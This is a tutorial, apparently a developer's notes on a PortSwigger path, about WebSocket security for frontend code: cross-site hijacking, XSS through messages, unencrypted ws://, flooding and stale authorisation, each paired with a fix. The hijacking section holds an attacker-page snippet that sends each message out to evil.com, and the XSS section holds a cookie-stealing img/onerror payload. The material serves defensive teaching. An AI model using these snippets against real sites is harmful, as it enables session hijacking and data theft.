# WebSockets Vulnerabilities

**Level:** Practitioner
**Path:** https://portswigger.net/web-security/learning-paths/websockets-security-vulnerabilities

## What Are WebSockets — in Simple Words

HTTP is like sending letters — you send a request, get a response, done. WebSockets are like making a phone call — once connected, both sides can talk freely, in real time, without hanging up and redialing.

```
HTTP (half-duplex):
  Client ──request──►  Server
  Client ◄──response── Server
  (connection closes)

WebSocket (full-duplex):
  Client ──upgrade──►  Server
  Client ◄────────────► Server   ← both sides send anytime
  Client ◄────────────► Server
  (stays open until one side hangs up)
```

**WebSockets give you a persistent, two-way channel between browser and server.** Used for chat apps, live dashboards, multiplayer games, stock tickers, collaborative editors — anything where waiting for polling is too slow.

## Why Should a Frontend Developer Care?

As a frontend dev, you're the one writing `new WebSocket(...)` and handling incoming messages. If you don't validate, sanitize, and secure what flows through that pipe, you're opening a hole that:

1. **XSS via WebSocket messages** — malicious data arrives and you render it into the DOM
2. **CSRF-like attacks** — an attacker's page opens a WebSocket to your server using the victim's cookies
3. **Data leakage** — sensitive data flows unencrypted or to unauthorized clients
4. **Denial of Service** — unthrottled messages flood your UI or crash the tab

The backend owns half the problem. **You own the other half.**

## How the WebSocket Handshake Works

The connection starts as a normal HTTP request, then "upgrades":

```
1. Browser sends HTTP upgrade request:

   GET /chat HTTP/1.1
   Host: example.com
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==    ← random, browser-generated
   Sec-WebSocket-Version: 13
   Cookie: session=abc123                            ← cookies sent automatically!
   Origin: https://example.com                       ← where the page lives

2. Server accepts:

   HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. Connection is now WebSocket — HTTP is done, raw frames flow both ways.
```

**Key security detail:** The browser sends cookies automatically on the upgrade request, just like any HTTP request. This is why cross-site WebSocket attacks work.

## The Vulnerabilities — One by One

### 1. Cross-Site WebSocket Hijacking (CSWSH)

This is the **CSRF equivalent for WebSockets** and the most important one to understand.

```
Normal flow:
  ┌──────────┐     WebSocket      ┌──────────┐
  │ Your App │ ◄────────────────► │  Server  │
  │ (legit)  │   Cookie: session  │          │
  └──────────┘                    └──────────┘

Attack flow:
  ┌──────────┐     WebSocket      ┌──────────┐
  │ Evil Page│ ◄────────────────► │  Server  │
  │ attacker │   Cookie: session  │          │
  │ controls │   (victim's!)      │ thinks   │
  └──────────┘                    │ it's the │
                                  │ real app │
                                  └──────────┘

  The victim visits evil.com while logged into your app.
  Evil.com opens a WebSocket to YOUR server.
  The browser attaches the victim's session cookie automatically.
  Server sees a valid session → accepts the connection.
  Attacker reads/writes messages as the victim.
```

**How the attacker does it (their page):**

```javascript
// On evil.com — attacker's page
const ws = new WebSocket('wss://your-app.com/chat');

ws.onopen = () => {
  // Send commands as the victim
  ws.send(JSON.stringify({ action: 'transfer', amount: 1000, to: 'attacker' }));
};

ws.onmessage = (event) => {
  // Steal the victim's data
  fetch('https://evil.com/steal?data=' + encodeURIComponent(event.data));
};
```

**Why it works:** The browser sends cookies on the WebSocket upgrade request. The server sees a valid session. There is no CSRF token check by default on WebSocket handshakes.

**The fix — check the Origin header server-side:**

```javascript
// Server-side (Node.js example)
wss.on('headers', (headers, req) => {
  const origin = req.headers.origin;
  const allowed = ['https://your-app.com', 'https://www.your-app.com'];

  if (!allowed.includes(origin)) {
    req.destroy(); // reject the connection
    return;
  }
});
```

**Frontend defense — use tokens instead of relying on cookies:**

```javascript
// Frontend: send auth token in the first message, not via cookies
const ws = new WebSocket('wss://your-app.com/chat');

ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'auth',
    token: getCSRFToken() // or a short-lived JWT
  }));
};
```

### 2. XSS via WebSocket Messages

WebSocket messages are **untrusted input** — they come from the server, but the server may be relaying messages from other users (chat, comments, collaborative editing).

```
Attacker sends via WebSocket:
  { "user": "alice", "message": "<img src=x onerror=alert(document.cookie)>" }

Your frontend renders it:
  chatDiv.innerHTML = data.message;   ← XSS! Script executes.

The attacker's payload runs in every connected user's browser.
```

**The attack flow:**

```
  Attacker ──sends malicious msg──► Server ──broadcasts──► All Clients
                                                              │
                                                    ┌─────────┴─────────┐
                                                    │ innerHTML = msg   │
                                                    │ → XSS executes!  │
                                                    └───────────────────┘
```

**The fix — never use innerHTML with WebSocket data:**

```javascript
// BAD — XSS
chatDiv.innerHTML += `<p>${data.message}</p>`;

// GOOD — textContent escapes HTML automatically
const p = document.createElement('p');
p.textContent = data.message;  // safe: treats everything as text
chatDiv.appendChild(p);

// GOOD — if you need rich formatting, use a sanitizer
import DOMPurify from 'dompurify';  // already in your deps? use it
chatDiv.innerHTML += DOMPurify.sanitize(data.message);
```

**Rule: treat every WebSocket message like user input from a stranger.**

### 3. Insecure WebSocket Connection (ws:// instead of wss://)

```
ws://  = WebSocket over plain HTTP    (no encryption)
wss:// = WebSocket over HTTPS/TLS     (encrypted)

Using ws:// is like shouting your conversation across a crowded room.
Anyone on the network can read and modify messages.
```

```
ws:// (insecure):
  Client ──────── [  open network  ] ──────── Server
                        ▲
                    Attacker reads
                    and modifies
                    every message

wss:// (secure):
  Client ════════ [ TLS encrypted ] ════════ Server
                        ▲
                    Attacker sees
                    only gibberish
```

**The fix — one character:**

```javascript
// BAD
const ws = new WebSocket('ws://your-app.com/chat');

// GOOD
const ws = new WebSocket('wss://your-app.com/chat');
```

If your site uses HTTPS (it should), **always use wss://**. Browsers will block `ws://` on HTTPS pages anyway (mixed content).

### 4. No Input Validation on Messages

WebSocket is a raw pipe — no built-in schema, no content-type, no validation. Whatever bytes arrive, your code processes them.

```
Server expects:    { "type": "chat", "message": "hello" }
Attacker sends:    { "type": "admin", "action": "deleteAll" }
                   { "type": "chat", "message": "a]".repeat(1000000) }
                   not even JSON at all — just raw garbage bytes
```

**Frontend defense:**

```javascript
ws.onmessage = (event) => {
  let data;
  try {
    data = JSON.parse(event.data);
  } catch {
    return; // not JSON — drop it
  }

  // Validate the shape
  if (typeof data.type !== 'string' || typeof data.message !== 'string') {
    return; // unexpected shape — drop it
  }

  // Validate length (prevent UI flooding)
  if (data.message.length > 10000) {
    return;
  }

  // Now safe to use
  renderMessage(data);
};
```

### 5. No Rate Limiting / Message Flooding

WebSockets have no built-in rate limiting. A malicious client (or a buggy one) can blast thousands of messages per second.

```
Normal:     Client ──msg──msg──msg──► Server (manageable)

Flood:      Client ──msg msg msg msg msg msg msg msg msg──► Server
                     msg msg msg msg msg msg msg msg msg
                     msg msg msg msg msg msg msg msg msg
                     (server overwhelmed, other users lag or disconnect)
```

**Frontend defense (protect your own UI):**

```javascript
let messageCount = 0;
const MAX_MESSAGES_PER_SECOND = 50;

setInterval(() => { messageCount = 0; }, 1000);

ws.onmessage = (event) => {
  messageCount++;
  if (messageCount > MAX_MESSAGES_PER_SECOND) {
    console.warn('Too many messages, dropping');
    return;
  }
  handleMessage(event.data);
};
```

### 6. Lack of Authentication / Authorization

WebSocket connections often authenticate at handshake time and then assume all messages are authorized. But the connection is long-lived — a user's permissions might change mid-session.

```
Timeline:
  t=0   User connects, has admin role        ✓ authorized
  t=5m  Admin revokes user's admin role
  t=6m  User sends admin command via WS      ✗ should be rejected
                                              but server still thinks
                                              they're admin from t=0
```

**Frontend responsibility:** Don't cache authorization state. If the server sends a "permission denied" message, respect it immediately — don't retry or ignore.

## Real-World Analogy

Think of WebSockets like a walkie-talkie:

- **HTTP** = writing letters. You write, send, wait for reply. Secure because each letter is sealed.
- **WebSocket** = walkie-talkie. Both sides talk freely. But:
  - Anyone can buy the same walkie-talkie and join your channel (**CSWSH**)
  - Someone can shout offensive things over the channel and everyone hears it (**XSS**)
  - Without encryption, anyone nearby can listen (**ws:// vs wss://**)
  - Someone can hold the talk button down and block everyone else (**flooding**)
  - You verify identity when they first join, but never again (**stale auth**)

## Frontend Developer's Security Checklist

```
Connection:
  ✓ Always use wss:// (never ws://)
  ✓ Don't rely solely on cookies for auth — send a token after connect
  ✓ Implement reconnection with exponential backoff (not instant retry loops)

Receiving Messages:
  ✓ Parse inside try/catch — drop malformed data
  ✓ Validate message shape and types before processing
  ✓ NEVER use innerHTML with WebSocket data — use textContent or a sanitizer
  ✓ Cap message size and rate on the client side
  ✓ Don't trust message content — validate same as any user input

Sending Messages:
  ✓ Sanitize user input before sending (defense in depth)
  ✓ Don't send sensitive data (passwords, tokens) over the WebSocket payload
  ✓ Validate that the connection is open before sending

Lifecycle:
  ✓ Close the WebSocket on logout / page unload
  ✓ Handle server disconnections gracefully
  ✓ Don't store sensitive data from WebSocket messages in localStorage
```

## The Frontend Security Flow

```
  Incoming WebSocket Message
           │
           ▼
  ┌─────────────────┐
  │ Is it valid JSON? │──── NO ──► Drop silently
  └────────┬────────┘
           │ YES
           ▼
  ┌─────────────────┐
  │ Expected shape?  │──── NO ──► Drop silently
  │ (type, fields)   │
  └────────┬────────┘
           │ YES
           ▼
  ┌─────────────────┐
  │ Within size/rate │──── NO ──► Drop + warn
  │ limits?          │
  └────────┬────────┘
           │ YES
           ▼
  ┌─────────────────────┐
  │ Sanitize before     │
  │ rendering to DOM    │
  │ (textContent or     │
  │  DOMPurify)         │
  └────────┬────────────┘
           │
           ▼
  ┌─────────────────┐
  │ Render to UI     │
  └─────────────────┘
```

## Why This Is "Security in Transition"

WebSockets break the assumptions HTTP was designed around:

```
HTTP assumptions:                    WebSocket reality:
─────────────────                    ──────────────────
Request → Response (done)            Persistent connection (stays open)
Each request has headers             After handshake, raw frames only
CORS blocks cross-origin reads       No CORS on WebSocket connections!
CSRF tokens in forms                 No forms — no token submission point
Server controls response timing      Either side sends anytime
Stateless (each request is fresh)    Stateful (connection = session)
```

The web security model was built for HTTP's request-response cycle. **WebSockets sidestep that model entirely.** CORS doesn't apply. CSRF tokens have no natural place. The browser sends cookies on the handshake but provides no built-in cross-origin protection after that.

This is the same pattern as CORS, HSTS, and Web Cache Deception — **the technology changed but the security tooling didn't keep up.**

## Interview Quick-Fire

| Question | Answer |
|----------|--------|
| What is CSWSH? | Cross-Site WebSocket Hijacking — an attacker's page opens a WebSocket to your server using the victim's cookies |
| Why don't CSRF tokens work automatically? | WebSocket handshake is a GET with no form body — standard CSRF token submission doesn't apply |
| Does CORS protect WebSockets? | No — the browser doesn't enforce CORS on WebSocket connections. The server must check the Origin header manually |
| How do you prevent XSS via WebSocket? | Never use `innerHTML` with WebSocket data. Use `textContent` or a sanitizer like DOMPurify |
| ws:// vs wss://? | `wss://` encrypts with TLS (like HTTPS). Always use `wss://` in production |
| How to authenticate a WebSocket? | Send a token (JWT or CSRF) in the first message after connection, or use ticket-based auth in the URL |
| What's the Origin header check? | Server-side: reject WebSocket handshakes where the Origin header isn't your app's domain |
| Can WebSocket messages be tampered with? | Over `ws://`, yes — MITM can read and modify. Over `wss://`, encrypted in transit |

## WebSocket vs HTTP Security Comparison

```
                        HTTP            WebSocket
                        ────            ─────────
Transport security      HTTPS           wss:// (TLS)
Cross-origin control    CORS headers    Origin header (manual check)
CSRF protection         Tokens/SameSite Must implement manually
Input validation        Form validation No built-in schema
Rate limiting           Per-request     Must implement per-message
Auth model              Per-request     Per-connection (long-lived)
Browser protections     Many            Very few
```

## Key Takeaway

WebSockets give you real-time power but strip away most of HTTP's built-in security guardrails. As a frontend developer, your job is to treat every WebSocket message as untrusted input (sanitize before DOM), never rely on cookies alone for auth (send tokens), always use `wss://`, and implement client-side rate limiting and validation. The server must check the `Origin` header on every handshake — but you own everything that happens after the message arrives in the browser.
